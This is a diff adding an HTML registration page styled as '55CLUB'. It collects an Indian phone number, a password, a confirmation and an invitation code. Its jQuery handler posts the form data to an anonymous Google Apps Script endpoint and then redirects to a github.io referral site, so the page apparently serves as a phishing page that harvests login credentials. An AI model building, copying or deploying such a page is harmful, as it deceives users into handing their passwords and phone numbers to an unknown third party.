@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Register - 55CLUB</title>
+    <style>
+        :root {
+            --primary: #FF6B6B;
+            --background: #FFF;
+            --text: #333;
+            --border: #E5E7EB;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: var(--background);
+        }
+
+        .header {
+            background: var(--primary);
+            color: white;
+            padding: 1rem;
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+            padding: 0.5rem;
+        }
+
+        .language-selector {
+            position: absolute;
+            right: 1rem;
+            background: none;
+            border: none;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            cursor: pointer;
+        }
+
+        .container {
+            padding: 2rem 1rem;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .form-title {
+            text-align: center;
+            margin-bottom: 2rem;
+            color: var(--primary);
+            font-size: 1.25rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-group {
+            display: flex;
+            border: 1px solid var(--border);
+            border-radius: 0.5rem;
+            overflow: hidden;
+        }
+
+        .country-code {
+            padding: 0.75rem;
+            border: none;
+            background: var(--background);
+            border-right: 1px solid var(--border);
+        }
+
+        input {
+            width: 100%;
+            padding: 0.75rem;
+            border: none;
+            outline: none;
+            font-size: 1rem;
+        }
+
+        .password-input {
+            position: relative;
+        }
+
+        .password-input input {
+            padding-right: 2.5rem;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 0.75rem;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            opacity: 0.5;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin: 1rem 0;
+        }
+
+        .checkbox-group a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        .register-button {
+            width: 100%;
+            padding: 1rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+
+        .support-icon {
+            position: fixed;
+            bottom: 1rem;
+            right: 1rem;
+            background: white;
+            border-radius: 50%;
+            padding: 0.5rem;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <button class="back-button">←</button>
+        <h1>Register</h1>
+        <button class="language-selector">
+            <img src="https://e7.pngegg.com/pngimages/666/76/png-clipart-flag-of-the-united-states-national-flag-usa-flag-flag-logo.png" alt="US flag" width="20" height="20">
+            EN
+        </button>
+    </header>
+
+    <div class="container">
+        <h2 class="form-title">Register your phone</h2>
+        
+        <form id="submit-form"  action="" >
+            <div class="form-group">
+                <div class="input-group">
+                    <select class="country-code">
+                        <option value="+91">+91</option>
+                    </select>
+                    <input name="name" type="tel" placeholder="Please enter the phone number">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-group password-input">
+                    <input name="name" type="password" placeholder="Set password">
+                    <span class="eye-icon">👁️</span>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-group password-input">
+                    <input name="name" type="password" placeholder="Confirm password">
+                    <span class="eye-icon">👁️</span>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-group">
+                    <input name="name" type="text" placeholder="Please enter the invitation code">
+                </div>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="privacy">
+                <label for="privacy">
+                    I have read and agree <a href="#">Privacy Agreement</a>
+                </label>
+            </div>
+
+            <button type="submit" class="register-button">Register</button>
+        </form>
+    </div>
+
+    <div class="support-icon">
+        💬
+    </div>
+
+    <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbyG5Wwvvi_JpTOWEMjp0HBm8SuJ41i-NOgfpTlj3pNuMJUGGgqftP_p3iox4nK7YILK/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("CLICK OK")
+                    window.location.reload()
+                    window.location.href="https://55clubreferral.github.io/homepage/"
+                },
+                error:function (err){
+                    alert("Something Error")
+    
+                }
+            })
+        })
+    </script>
+</body>
+</html>
